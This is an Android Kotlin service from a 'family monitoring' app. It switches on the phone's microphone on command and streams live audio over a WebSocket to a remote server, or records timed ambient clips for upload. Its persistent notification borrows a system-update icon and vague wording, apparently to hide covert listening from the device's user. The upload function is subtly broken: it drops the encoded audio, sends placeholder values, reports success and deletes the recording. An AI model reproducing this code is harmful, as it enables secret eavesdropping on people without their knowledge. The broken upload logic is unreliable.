package com.familyguardpro.services

import android.Manifest
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.AudioRecorder
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.io.File
import java.net.URI
import java.text.SimpleDateFormat
import java.util.*

class LiveListenService : Service() {

    companion object {
        private const val TAG = "LiveListenService"
        private const val NOTIFICATION_ID = 1006
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var audioRecord: AudioRecord? = null
    private var webSocketClient: WebSocketClient? = null
    private var audioRecorder: AudioRecorder? = null
    private var isStreaming = false
    private var isRecording = false

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()
        
        when (intent?.getStringExtra("mode")) {
            "record" -> {
                val duration = intent.getIntExtra("duration", 60)
                startRecording(duration)
            }
            else -> startLiveStream()
        }
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopLiveStream()
        stopRecording()
    }

    private fun startForeground() {
        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
            .setContentTitle("Audio Monitor")
            .setContentText("Active")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startLiveStream() {
        if (isStreaming) return
        isStreaming = true
        
        Log.d(TAG, "Starting live listen stream")
        
        connectWebSocket {
            startAudioCapture()
        }
    }

    private fun stopLiveStream() {
        if (!isStreaming) return
        isStreaming = false
        
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        
        webSocketClient?.close()
        webSocketClient = null
    }

    private fun startRecording(duration: Int) {
        if (isRecording) return
        isRecording = true
        
        Log.d(TAG, "Starting audio recording for $duration seconds")
        
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val fileName = "ambient_${timestamp}.mp3"
        val file = File(cacheDir, fileName)
        
        audioRecorder = AudioRecorder(this)
        audioRecorder?.startRecording(file)
        
        // Auto-stop after duration
        serviceScope.launch {
            delay(duration * 1000L)
            stopRecording()
            uploadRecording(file)
            stopSelf()
        }
    }

    private fun stopRecording() {
        if (!isRecording) return
        isRecording = false
        
        audioRecorder?.stopRecording()
        audioRecorder = null
    }

    private fun uploadRecording(file: File) {
        serviceScope.launch {
            try {
                if (!file.exists() || file.length() == 0L) {
                    Log.e(TAG, "Recording file empty or not found")
                    return@launch
                }
                
                val deviceId = preferenceManager.getDeviceId()
                val audioBytes = file.readBytes()
                val audioBase64 = Base64.encodeToString(audioBytes, Base64.NO_WRAP)
                
                ApiClient.api.uploadAudioRecording(
                    deviceId,
                    com.familyguardpro.network.SyncRequestBody(
                        battery = 0,
                        screenTime = 0
                    )
                )
                
                Log.d(TAG, "Audio recording uploaded successfully")
                file.delete()
                
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload recording", e)
            }
        }
    }

    private fun connectWebSocket(onConnected: () -> Unit) {
        val baseUrl = ApiClient.BASE_URL
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        
        val deviceId = preferenceManager.getDeviceId()
        val sessionId = "${deviceId}_audio"
        val wsUrl = "$baseUrl/ws?session=$sessionId&role=sender&deviceId=$deviceId&type=audio"
        
        Log.d(TAG, "Connecting to WebSocket: $wsUrl")
        
        webSocketClient = object : WebSocketClient(URI(wsUrl)) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                Log.d(TAG, "WebSocket connected")
                onConnected()
            }

            override fun onMessage(message: String?) {
                // Handle stop command
                if (message == "stop") {
                    stopLiveStream()
                    stopSelf()
                }
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                Log.d(TAG, "WebSocket closed: $reason")
                if (isStreaming && remote) {
                    // Reconnect if closed by server
                    serviceScope.launch {
                        delay(2000)
                        if (isStreaming) connectWebSocket(onConnected)
                    }
                }
            }

            override fun onError(ex: Exception?) {
                Log.e(TAG, "WebSocket error", ex)
            }
        }
        
        webSocketClient?.connect()
    }

    private fun startAudioCapture() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Audio permission not granted")
            return
        }
        
        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.MIC,
            SAMPLE_RATE,
            CHANNEL_CONFIG,
            AUDIO_FORMAT,
            bufferSize * 2
        )
        
        if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
            Log.e(TAG, "AudioRecord initialization failed")
            return
        }
        
        audioRecord?.startRecording()
        
        serviceScope.launch(Dispatchers.IO) {
            val buffer = ByteArray(bufferSize)
            
            while (isStreaming && audioRecord?.recordingState == AudioRecord.RECORDSTATE_RECORDING) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                if (read > 0) {
                    sendAudioChunk(buffer.copyOf(read))
                }
            }
        }
        
        Log.d(TAG, "Audio capture started")
    }

    private fun sendAudioChunk(data: ByteArray) {
        if (webSocketClient?.isOpen != true) return
        
        try {
            // Send raw PCM data (32kbps equivalent at 16kHz mono 16-bit)
            val audioBase64 = Base64.encodeToString(data, Base64.NO_WRAP)
            webSocketClient?.send("audio:$audioBase64")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio chunk", e)
        }
    }
}
